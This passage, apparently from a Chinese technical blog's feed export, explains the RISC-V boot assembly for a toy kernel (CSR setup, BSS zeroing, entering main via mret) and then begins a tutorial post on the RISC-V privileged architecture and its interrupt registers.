寄存器</h3><p>现在，我们就要开始设置一些寄存器了以及一些初始化任务。</p><p>我们需要取消内存分页机制，这样我们就可以完全控制 MMU (Memory Management Unit) ，只不过控制的方式就是让 virtual memory = physical memory 。参考 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a> 和 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a>，使用 csrw 语句，向 satp 寄存器写 0 即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm"># SATP should be 0 <br># Supervisor Address Translation and Protection<br>csrw satp, zero<br></code></pre></td></tr></table></figure><h3 id="mstatus-寄存器">mstatus 寄存器</h3><p>刚开始执行代码一定是机器模式，但是我们总不能一直让 hart 在机器模式下运行；此外，全局中断使能位也需要我们控制。这些都可以在 <code>mstatus</code> 寄存器上找到，关于 <code>mstatus</code> 寄存器，<a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a> 和 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a>上都有详细介绍。在此就略写几句。</p><p>当进入 <code>main</code> 函数时，hart 最好要进入监管者模式。因为 <code>main</code> 函数事实上是我们操作系统内核最主要的函数之一，此外，我们也希望中断能被打开。对照 <a href="#mstatus"><code>mstatus</code> 寄存器</a>的位图，我们可以在对应位域置 1 ，来打开中断或者记录信息等。</p><span id="mstatus">![](/img/mstatus.png)<p>比如，我们想先打开机器模式的中断使能，那么我们需要：</p><ul><li>将 <code>mstatus.MIE</code> 位置为 1 ，因为它代表机器模式全局下的中断使能</li><li>将 <code>mstatus.MPIE</code> 位置为 1 ，它代表了在中断/异常发生前，机器模式全局下的中断使能（我们肯定不想在中断/异常发生一次后，使能就失效了吧）</li></ul><p>我们还要将 <code>mstatus.MPP</code> 位置为 01，它代表了中断/异常发生前，代码运行的模式。之所以置为 01（监管者模式），是为了在执行 <code>mret</code> 的时候进入监管者模式。结合之前所说的，写下如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">li   t0, (0b01 &lt;&lt; 11) | (1 &lt;&lt; 7) | (1 &lt;&lt; 3)<br>csrw mstatus, t0<br></code></pre></td></tr></table></figure><h3 id="初始化-BSS-数据段">初始化 BSS 数据段</h3><p>如果你了解了 <a href="https://blog.csdn.net/jxm_csdn/article/details/39829535">C 语言内存分布</a>，你就会知道全局未初始化变量都会放在 BSS 段中，即我们在链接器文件里描述的 <code>.bss</code> section 。这里不得不说一句，写 C/C++ 未在定义时初始化是非常危险的😅，因为这会导致不确定行为。那么，作为操作系统的开发人员，初始化 BSS 数据段的责任就担在我们身上了。</p><p>还记得我们之前定义的 <code>__bss_start</code> 和 <code>__bss_end</code> 吧，它们一个在 <code>.bss</code> 数据段前面，一个在后面，这两个符号是为方便数据初始化而设定的，那么目前，我们先把 <code>.bss</code> 段全部初始化为 0 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nasm">    la  a0, __bss_start<br>    la  a1, __bss_end<br>    bgeu a0, a1, 2f<br>l1:<br>    sd   zero, (a0)<br>    addi a0, a0, 8<br>    bltu a0, a1, l1<br></code></pre></td></tr></table></figure><p>只要你熟悉了 RISC-V 汇编语言，你肯定不难看懂上面的代码。它的作用就是从 <code>__bss_start</code> 开始循环，每次将 0 存放到目标地址，直到 <code>__bss_end</code> 为止。</p><h3 id="mie-寄存器">mie 寄存器</h3><p><code>mie</code> 寄存器包含了中断使能位，用于控制中断是否有效。其位域如下图：</p><span id="mie"><p><img src="/img/mie.png" alt=""></p><p>我们除了要打开机器模式下的全局中断使能，还需要打开软件、时钟、外部这三部分子中断使能，参照 <a href="#mie"><code>mie</code> 寄存器的位域图</a>，我们可以写出下面的代码，打开所有机器模式下的中断使能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">li   t3, (1 &lt;&lt; 3) | (1 &lt;&lt; 7) | (1 &lt;&lt; 11)<br>csrw mie, t3<br></code></pre></td></tr></table></figure><h3 id="mtvec-寄存器">mtvec 寄存器</h3><p><code>mtvec</code> 寄存器又是什么？该寄存器全名 Machine Trap-Vector Base-Address Register，它存放了 trap vector 信息，包括了基地址和模式位。换句话说，当中断/异常发生时，PC 值肯定需要跳转到中断/异常处理程序，该寄存器就保存了这些处理程序的地址。对 <code>mtvec</code> 寄存器的详细介绍，还是要参考 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a> 和 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a> 和 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged manual</a> 资料。</p><p>我们先不考虑中断/异常处理程序，先定义一个符号 <code>mtrap_vector</code> ，把它当作处理程序的开始点，然后，把它放入到 <code>mtvec</code> 寄存器中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">la   t2, mtrap_vector<br>csrw mtvec, t2<br></code></pre></td></tr></table></figure><h3 id="转到-main">转到 main</h3><p>看起来我们快要写完了。到这时候，大家可能会变得不耐烦且急躁。于是，写出了最后一句指令 <code>mret</code> 。</p><p>哦不，等等，<code>mret</code>  指令会把我们带到哪里？回顾一下 <code>crt0.s</code> ，在快结束的时候，我们使用指令 <code>jal zero, main</code> 跳转到了 <code>main</code> 函数里，我们的 <code>boot.s</code> 当然也需要跳转到 <code>main</code> 函数。但是，我们还可以用 <code>jal zero, main</code> 指令跳转吗？不行。这样跳转的话，我们仍在机器模式下。为了使 hart 跑在监管者模式下，我们必须使用 <code>mret</code> 。</p><p>所以，<code>mret</code>  指令会把我们带到哪里？参考 RISC-V 的相关资料，在处理 <code>mret</code> 指令时，PC 值会从 <code>mepc</code> 寄存器取得。因此，我们必须将 <code>main</code> 函数的地址存入 <code>mepc</code> 寄存器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">la   t1, main<br>csrw mepc, t1<br>...<br>mret<br></code></pre></td></tr></table></figure><p>我们把 <code>main</code> 函数的地址写入到了 <code>mepc</code> 寄存器中，回想一下 <code>mepc</code> 寄存器，它是用来存放中断处理完后的恢复执行的地址。那么在执行了 <code>mret</code> 之后， PC 值会被置为 <code>mepc</code> 寄存器中的数值，程序就会自己跳转到 <code>main</code> 函数里面了。</p><h2 id="接下来">接下来</h2><p>今天，我们一口气介绍了好多寄存器以及中断相关的内容！这可能相当令人烦躁，但也请静下心来，多多尝试，仔细理解每一步。由于这次我将代码进行了拆分介绍，虽然每个地方更加清楚，但缺乏整体观念，因此，在这里将完整代码列出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nasm"># boot.s<br><br>.section .init,&quot;ax&quot;<br>.global _start<br>_start:<br>    # read our hart identifier into t0<br>    # see if it is 0 if not to busy loop<br>    csrr t0, mhartid<br>    bnez t0, 4f<br><br>    # SATP should be 0 Supervisor Address Translation and Protection<br>    csrw satp, zero<br>    .option push<br>    .option norelax<br>    la   gp, __global_pointer$<br>    .option pop<br><br>    # BSS section expected to be 0<br>    la  a0, __bss_start<br>    la  a1, __bss_end<br>    bgeu a0, a1, 2f<br>1:<br>    sd   zero, (a0)<br>    addi a0, a0, 8<br>    bltu a0, a1, 1b<br>2:<br>    la   sp, __stack_top<br>    li   t0, (0b01 &lt;&lt; 11) | (1 &lt;&lt; 7) | (1 &lt;&lt; 3)<br>    csrw mstatus, t0<br>    la   t1, main<br>    csrw mepc, t1<br>    la   t2, mtrap_vector<br>    csrw mtvec, t2<br>    li   t3, (1 &lt;&lt; 3) | (1 &lt;&lt; 7) | (1 &lt;&lt; 11)<br>    csrw mie, t3<br>    la   ra, 4f<br>    mret<br>4:<br>    wfi<br>    j 4b<br></code></pre></td></tr></table></figure><p>在本篇博客，我们重点讲述了 <code>boot.s</code> 的代码的功能，并详尽地介绍了 RISC-V 特权模式以及一部分寄存器的功能。这全是在为之后的工作铺路，接下来我们就要实现时钟中断了，时钟中断十分重要，没有它，我们就无法切换进程，实现进程间的调度。</p><h2 id="附：数据的分布">附：数据的分布</h2><p>为了理清 RISC-V 中数据到底如何分布，特做以下实验，一方面是为了验证自己的理论知识，另一方面，也是为了检查程序是否有 bug 。话不多说，直接开始实验。</p><p>该实验只需要 <code>crt0.s</code> 和 <code>main.c</code> 文件即可，本章中的内容可以不用增加到 <code>crt0.s</code> 文件中。而 <code>main.c</code> 文件，我增加了不少内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> sg[] = <span class="hljs-string">&quot;hello world!&quot;</span>;<br><span class="hljs-type">char</span> g[] = <span class="hljs-string">&quot;hi RISC-V&quot;</span>;<br><span class="hljs-type">int</span> ga;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">102</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> sl = <span class="hljs-number">105</span>;<br>    uartinit();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        uartputc(sg[i]);<br>    uartputc(l);<br>    uartputc(sl);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++)<br>        uartputc(g[i]);<br>    <span class="hljs-keyword">if</span> (ga == <span class="hljs-number">0</span>)<br>        uartputc(<span class="hljs-string">&#x27;g&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先来看看各种类型的数据：</p><ul><li><p><code>sg</code> 静态全局已初始化</p></li><li><p><code>g</code> 全局已初始化</p></li><li><p><code>ga</code> 全局未初始化</p></li><li><p><code>l</code>局部已初始化</p></li><li><p><code>sl</code> 静态局部已初始化</p></li></ul><p>然后，我们可以按照之前给过的 <code>Makefile</code> 文件编译生成 <code>a.out</code>，我们首先看看运行结果：</p><p><img src="/img/run_5.png" alt=""></p><p>令人欣慰的是，我们的程序没啥错误（至少到目前为止是这样），为了更好地明确各个数据的位置，我们需要用到 <code>objdump</code> 工具，反编译生成的文件 <code>a.out</code>。在 shell 中输入：<code>riscv64-unknown-elf-objdump -d a.out</code>，就可以得到反编译生成的 RISC-V 汇编语言。为了方便大家看得更加清楚，我单独将 <code>main</code> 的部分取出，并省略了一些对我们不重要的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nasm">0000000080000018 &lt;main&gt;:<br>     # allocate stack space<br>     # ...<br>    80000020:06600793          lia5,102# 局部变量 102 直接当作立即数<br>    80000024:fef42223          swa5,-28(s0)# 存入到 -28(s0)<br>    80000028:180000ef          jalra,800001a8 &lt;uartinit&gt;<br>    8000002c:fe042623          swzero,-20(s0)<br>    80000030:a00d                j80000052 &lt;main+0x3a&gt;<br>    80000032:00018713          mva4,gp# 会发现 a4 就在 gp 上<br>    80000036:fec42783          lwa5,-20(s0)# 即 gp 就是数据段的开头<br>    8000003a:97ba                adda5,a5,a4# 从 gp 中取出数据 sg<br>    8000003c:0007c783          lbua5,0(a5)<br>    80000040:2781                sext.wa5,a5<br>    80000042:853e                mva0,a5# 全局静态变量 sg<br>    80000044:1b8000ef          jalra,800001fc &lt;uartputc&gt;<br>    # loop var increasement<br>    # ...<br>    80000060:fe442783          lwa5,-28(s0)<br>    80000064:853e                mva0,a5# 从 -28(s0) 中取出 是局部变量 102<br>    80000066:196000ef          jalra,800001fc &lt;uartputc&gt;<br>    8000006a:01c1a783          lwa5,28(gp) # 8000101c &lt;sl.1504&gt;  # 静态变量 sl  从 gp 中取出<br>    8000006e:853e                mva0,a5<br>    80000070:18c000ef          jalra,800001fc &lt;uartputc&gt;<br>    80000074:fe042423          swzero,-24(s0)<br>    80000078:a00d                j8000009a &lt;main+0x82&gt;<br>    8000007a:01018713          addia4,gp,16 # 80001010 &lt;g&gt;<br>    8000007e:fe842783          lwa5,-24(s0)<br>    80000082:97ba                adda5,a5,a4# 从 gp 中取出 全局变量 g<br>    80000084:0007c783          lbua5,0(a5)<br>    80000088:2781                sext.wa5,a5<br>    8000008a:853e                mva0,a5<br>    8000008c:170000ef          jalra,800001fc &lt;uartputc&gt;<br>    #  loop var increasement<br>    #  ...<br>    800000a8:05c1a783          lwa5,92(gp) # 8000105c &lt;ga&gt;     # 从 gp 中取出 未初始化的全局变量 ga <br>    800000ac:e789                bneza5,800000b6 &lt;main+0x9e&gt;<br>    800000ae:06700513          lia0,103<br>    800000b2:14a000ef          jalra,800001fc &lt;uartputc&gt;<br># deallocate stack space and return <br># ...<br>    800000c0:8082                ret<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V 特权架构</title>
    <link href="/2020/08/05/2020-8-5-riscv-privileged/"/>
    <url>/2020/08/05/2020-8-5-riscv-privileged/</url>
    
    <content type="html"><![CDATA[<h2 id="RISC-V-特权架构">RISC-V 特权架构</h2><p>之前我在科大学习过 RISC-V ，但内容基本集中于用户模式下的一般指令的应用，因此本人对特权指令几乎一无所知。但是若要实现一个 RISC-V 内核，那么必然要对这些东西烂熟于心，因此今天，我们就来学习一下 RISC-V 特权指令集吧。</p><table><thead><tr><th style="text-align:center">模式</th><th>缩写</th><th>编码</th></tr></thead><tbody><tr><td style="text-align:center">机器模式</td><td>M</td><td>11</td></tr><tr><td style="text-align:center">Hypervisor</td><td>H</td><td>10</td></tr><tr><td style="text-align:center">监管者模式</td><td>S</td><td>01</td></tr><tr><td style="text-align:center">用户模式</td><td>U</td><td>00</td></tr></tbody></table><p>注：每一个特权级都有一组核心的特权 ISA 扩展，以及可选扩展和变种。支持的特权模式组合：<strong>M</strong> (Embedded without Protection)，<strong>M+U</strong> (Embedded with Protection)，<strong>M+S+U (Unix-like OS capable)</strong>, <strong>M+H+S+U</strong></p><h2 id="机器模式">机器模式</h2><p>机器模式是 RISC-V 中 <strong>hart (hardware thread 硬件线程)</strong> 可以执行的最高权限模式。在该模式下，hart 对内存、I/O 等所有必要的底层系统有着完全的使用权限。在几乎所有的基于 RISC-V 的嵌入式系统中，都对该模式进行了必要的实现与支持。</p><h3 id="中断与异常">中断与异常</h3><p>以下内容参考了 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册第十章</a> 和 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a>。</p><p>机器模式中，最重要的工作就是处理异常与中断。有以下几类异常、中断需要考虑：</p><ul><li>访问错误异常 访问了无效或者没有权限访问的内存地址</li><li>断点中断 执行 <code>ebreak</code> 指令，或者地址、数据与调试触发器设置的断点匹配</li><li>环境调用中断 执行 <code>ecall</code> 指令</li><li>非法指令异常 译码阶段发现了无效的指令</li><li>非对齐指令异常 在有效地址不能被访问大小整除时发生</li></ul><p>关于中断，有三种标准的中断源：<strong>软件、时钟和外部来源</strong>。</p><ul><li><p>软件中断通过向内存映射寄存器中存数来触发，并通常用于由一个 hart 中断另一个 hart（在其他架构中称为处理器间中断机制）。</p></li><li><p>时钟中断：当实时计数器 <code>mtime</code> 大于 <code>hart</code> 的时间比较器（一个名为 <code>mtimecmp</code> 的内存映射寄存器）时，会触发。RISC-V 规定，在机器模式下，只有当 <code>mtimecmp</code> 寄存器被重新写入后，<code>mip</code> 寄存器中的时钟中断标志位才会被清除。因此，每次处理时钟中断，都不能忘记更新 <code>mtimecmp</code> 。</p></li></ul><blockquote><p>Platforms provide a real-time counter, exposed as a <strong>memory-mapped machine-mode</strong> read-write register, <strong>mtime</strong>. <strong>mtime</strong> must run at constant frequency, and the platform must provide a mechanism for determining the timebase of mtime.</p><p>Platforms provide a 64-bit <strong>memory-mapped machine-mode</strong> timer compare register (<strong>mtimecmp</strong>), which causes a timer interrupt to be posted when the <strong>mtime</strong> register contains a value greater than or equal to the value in the <strong>mtimecmp</strong> register.</p></blockquote><ul><li>外部中断由平台级中断控制器（大多数外部设备连接到这个中断控制器）引发。不同的硬件平台具有不同的内存映射并且需要中断控制器的不同特性，因此用于发出和消除这些中断的机制因平台而异。所有 RISC-V 系统的共同问题是如何处理异常和屏蔽中断。</li></ul><p>RISC-V 的机器模式还提供了各种令人眼花缭乱的 CSR 寄存器：</p><table><thead><tr><th>寄存器</th><th>简写</th><th>描述</th></tr></thead><tbody><tr><td>Machine ISA Reg</td><td>misa</td><td>用于报告 hart 支持的 ISA 类型 <br>具体内容见 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a></td></tr><tr><td>Machine Vendor ID Reg</td><td>mvendorid</td><td>用于提供实现该系统的制作商供应商等信息</td></tr><tr><td>Machine Architecture ID Reg</td><td>marchid</td><td>指示了编码 hart 的基本微体系结构</td></tr><tr><td>Machine Implementation ID Reg</td><td>mimpid</td><td>提供了处理器实现版本的唯一编码。</td></tr><tr><td>Hart ID Reg</td><td>mhartid</td><td>指示了正在运行代码的硬件线程 ID</td></tr><tr><td>Machine Status Reg</td><td>mstatus</td><td>跟踪并控制 hart 当前的状态</td></tr><tr><td>Machine Trap-Vector <br>Base-Address Reg</td><td>mtvec</td><td>存放了发生异常时处理器需要跳转到的地址，<br>即中断向量表，还有向量模式</td></tr><tr><td>Machine Trap Delegation Reg</td><td>medeleg<br>mideleg</td><td>为提高性能，在 medeleg 和 mideleg 中提供单独的读/写位<br>以指示应由低特权级直接处理某些异常和中断。</td></tr><tr><td>Machine Interrupt Reg</td><td>mip<br>mie</td><td>mip 指示了正在提交的中断<br>mie 包含了处理器能处理的和忽略的中断</td></tr><tr><td>Machine Timer Reg</td><td>mtime<br>mtimecmp</td><td>内存映射寄存器 mtime 用于记录流逝的时间<br>mtimecmp 则用于时间的比较</td></tr><tr><td>Counter-Enable Reg</td><td>mcounteren</td><td>控制了对低层特权级的硬件性能监视器的可用性</td></tr><tr><td>Machine Scratch Reg</td><td>mscratch</td><td>暂时存放一个字大小的数据</td></tr><tr><td>Machine Exception PC</td><td>mepc</td><td>指向发生异常的指令</td></tr><tr><td>Machine Cause Reg</td><td>mcause</td><td>指示发生异常的种类</td></tr><tr><td>Machine Trap Value Reg</td><td>mtval</td><td>保存了 trap 的附加信息:出错的地址、<br>非法指令本身，对于其他异常，其值为0。</td></tr></tbody></table><p>幸好，我们需要重点关注的只有8个寄存器，如下：</p><ul><li>mtvec (Machine Trap Vector)</li><li>mepc (Machine Exception PC)</li><li>mcause (Machine Exception Cause)</li><li>mie (Machine Interrupt Enable)</li><li>mip (Machine Interrupt Pending)</li><li>mtval (Machine Trap Value)</li><li>mscratch (Machine Scratch)</li><li>mstatus (Machine Status)</li></ul><h3 id="CSR-寄存器">CSR 寄存器</h3><h4 id="mstatus-寄存器"><code>mstatus</code> 寄存器</h4><p>该寄存器在处理中断时会经常用到，且较为复杂，位域包含的信息较多，特在此专门介绍：</p><center><img src="/img/mstatus.png"/><div style="font-weight:bold">注:  WPRI: Write Preserve values, Reads Ignore values. 保留值<br>xIE: Interrupt Enable in  x mode 中断使能<br>xPIE: Previous Interrupt Enable in x mode 之前的中断使能<br>xPP: Previous Privilege mode up to x mode 之前的特权级别</div></center><p>在中断使能方面，<code>MIE</code> 、<code>SIE</code> 、<code>UIE</code> 分别提供了 machine mode 、supervisor mode 、user mode 的全局中断使能位，若一个 hart 运行在特权级别 <code>x</code> 下，当 <code>xIE = 1</code> 时中断全局打开，反之则关闭。在 hart 于 <code>x</code> 运行时，无论 <code>wIE</code> 为何值，低权限中断 <code>w &lt; x</code> 总是无效的，而无论 <code>yIE</code> 为何值，高权限中断 <code>y &gt; x</code> 总是有效。</p><p><code>MPIE</code> 和 <code>MPP</code> 分别存储了中断发生前的中断使能位和特权级别位。</p><p>类比于 <code>mstatus</code> 寄存器，较低权限的 <code>sstatus</code> 和 <code>ustatus</code> 寄存器也几乎同理，只不过少了一些东西而已。</p><h4 id="mip-寄存器"><code>mip</code> 寄存器</h4><p><code>mip</code> 寄存器指示了何种类型的中断正在传入 (pending)，与它相同功能的寄存器有 <code>sip</code> 和 <code>uip</code> 。</p><p>在该寄存器中，只有低特权级别的软件中断位 (USIP, SSIP)、时钟中断 (UTIP, STIP) 、外部中断 (UEIP, SEIP) 是可以通过 CSR 指令写入的，其他都是只读的。若有中断委托给了权限级别 <code>x</code> ，被委托的中断所对应的位（在 <code>xie</code> 和 <code>xip</code> 寄存器中）就可以使用了，否则，相应的位接地变 0 。</p><span id="mip"><center><img src="/img/mip.png" /><div>xTIP: timer interrupt-pending bit in x mode 时钟中断<br>xSIP: software interrupts in x mode 软件中断<br>xEIP: external interrupt 外部中断</div></center>因为今后工作的需要，请注意，`MTIP` 、`STIP` 、`UTIP` 位分别对应机器模式、监管者模式、用户模式的时钟中断信号。`MTIP` 位是只读的，而 `UTIP` 和 `STIP` 位在机器模式下可以写入，这就是将时钟中断处理下放给低级权限的方式。<h4 id="mie-寄存器"><code>mie</code> 寄存器</h4><p><code>mie</code> 寄存器包含了相应的中断使能位，<code>sie</code> 和 <code>uie</code> 功能相似。注意观察 <a href="#mcause_code"><code>mcause</code> 寄存器编码</a>，可以发现，**若 bit <code>i</code> 在 <code>mie</code> 和 <code>mip</code> 寄存器都置位，且全局中断位打开，那么中断 <code>i</code> 就会视作发生，并被处理。**一般情况下，在低权限运行时，机器模式的中断一直有效。</p><span id="mie"><center><img src="/img/mie.png" /><div>xTIE: timer interrupt-enable bit in x mode 时钟中断使能位<br>xSIE: software interrupt-enable in x mode 软件中断使能位<br>xEIE: external interrupt-enable in x mode 外部中断使能位</div></center><h4 id="mcause-寄存器"><code>mcause</code> 寄存器</h4><p><code>mcause</code> 寄存器的作用是记录中断/异常事件的类型/起因。在当 trap 进入机器模式后，将异常/中断事件产生的起因（或者称之为谁导致了异常/中断事件）写入到该寄存器中。</p><span id="mcause_code"><center><img src="/img/mcause.png" /><div>mcause 寄存器编码形式，首位为 1 时是中断，0 时为异常</div></center><span id="mcause"><center><img src="/img/mcause_table.png" /><div>mcause 寄存器对应事件表</div></center><p>上表详细记录了各个中断/异常事件的代码编号，我们以后会经常用到。大家仔细观察 <a href="#mcause">mcause 寄存器对应事件表</a>和<a href="#mie"> mie 寄存器位编码图</a> 、<a href="#mip">mip 寄存器位编码图</a>，会发现 <code>mcause</code> 中编码的事件号的数字，正巧就等于 <code>mie</code> 、<code>mip</code>中对应事件的位偏移量。这一巧妙的设计在今后可能会带来意想不到的方便！</p><p>还有一点就是，当一个指令遇到了多个异常时（这条指令是多么的不幸啊），那么处理异常的优先级也是不一样的，下表很详细的列出了它们的优先级关系：</p><center><img src="/img/sync_exception_priority.png" /></center>#### `mtvec` 寄存器<p>该寄存器全名 Machine Trap-Vector Base-Address Register，它存放了 trap vector 的信息，包括了基地址和模式 Mode 。基地址要求必须 4 字节对齐，即确保末两位为 0 。当中断/异常发生时，PC 值肯定需要跳转到中断/异常处理程序，该寄存器就保存了这些处理程序的地址。该寄存器有两种使用方法，直接寻址和间接寻址。</p><center><img src="/img/mtvec.png" /></center><p>直接寻址时，Mode = 0 ，所有转到机器模式下的 traps 都会将基地址值赋给 PC ；间接寻址时，Mode = 1 ，所有转到机器模式的<strong>同步异常</strong>会把基地址传给 PC，而遇到中断时，会根据中断的编号形成特定的偏移量，加上基地址后再赋给 PC ，事实上，中断程序的处理程序地址就是以数组的形式存放在 <code>mtvec</code> 部分了。例如，如果一个机器模式的时钟中断产生了，那么 PC 会被设置为 BASE + 7 * 4 = BASE + 0x1c 。</p><hr><p>好，了解了 <code>mstatus</code> 以及 <code>mip</code> 、<code>mie</code> 、<code>mcause</code> 后，我们明白：</p><ul><li>处理器在机器模式下运行，在全局中断使能位 <code>mstatus.MIE</code> 置 1 时才会产生中断。</li><li>每个中断在控制状态寄存器 <code>mie</code> 以及 <code>mip</code> 中都有自己的使能位。</li></ul><p>例如，将所有三个控制状态寄存器合在一起考虑，如果 <code>mstatus.MIE=1</code>，<code>mie[7]=1</code>，且 <code>mip[7]=1</code>，则 CPU 就会开始处理机器模式的时钟中断。</p><p>一般来说，发生中断/异常时，机器会：</p><ul><li>对于中断，将目前的 PC 保存到 <code>mepc</code> 中，新 PC 从 <code>mtvec</code> 中取出。对于异常，<code>mepc</code> 保存了指向异常的指令</li><li>根据异常的类型及来源，设置 <code>mcause</code> ，并对 mtval 进行相应设置</li><li><code>mstatus</code> 中的 <code>MIE</code> 位置 0 ，禁止中断，并把先前的 <code>MIE</code> 值保存到 <code>MPIE</code> (Machine Previous Interrupt Enable) 中。</li><li>发生异常之前的权限模式保存在 <code>mstatus</code> 的 <code>MPP</code> 域中，再把权限模式改为 M</li></ul><h3 id="中断嵌套">中断嵌套</h3><p>有时需要在处理 异常/中断 的过程中，会需要转到处理更高优先级的中断。然而任何体系结构都不可能有这么多资源去满足近乎无限的中断嵌套。 <code>mepc</code> <code>mcause</code>，<code>mtval</code> 和 <code>mstatus</code> 这些控制寄存器都只有一个，因此，如果第二个中断到来，就需要软件的帮助，否则这些寄存器中的旧值会被破坏，导致数据丢失。<strong>可抢占的中断处理程序可以在启用中断之前把这些寄存器保存到内存中的栈，然后在退出之前,禁用中断并从栈中恢复寄存器。</strong></p><p>除了上面介绍的 <code>mret</code> 指令之外，机器模式还提供了另外一条指令：wfi (Wait For Interrupt)。wfi 通知处理器目前没有任何有用的工作，所以它应该进入低功耗模式，直到任何使能有效的中断等待处理，即 <code>mie&amp;mip ≠ 0</code>时。对该指令的实现，RISC-V 处理器有多种方式：中断待处理之前都停止时钟；有的时候只把这条指令当作 <code>nop</code> 来执<br>行。因此，wfi 通常在循环内使用。</p><h3 id="物理内存保护">物理内存保护</h3><p>在机器模式下，我们可以自由地访问各种硬件平台。然而，一旦我们将这些艰巨的任务转给用户，他们可能会毁了一切。我们需要一种可靠的机制，保护系统免受不可信代码的危害，为不受信任的进程提供隔离保护。以下内容参考了 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册第十章</a> 和 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a>。</p><p>在硬件设计里，PMP (Phsical Memory Protection) 是可选项，但在大部分地方我们都可以见到它的身影。PMP 检查一般用于 hart 在监管者模式或用户模式下的所有访问；或者在 <code>mstatus.MPRV = 1</code> 时的 load 和 store 等情况。一旦触发 PMP 保护，RISC-V 要求产生精确中断并处理。</p><p>PMP 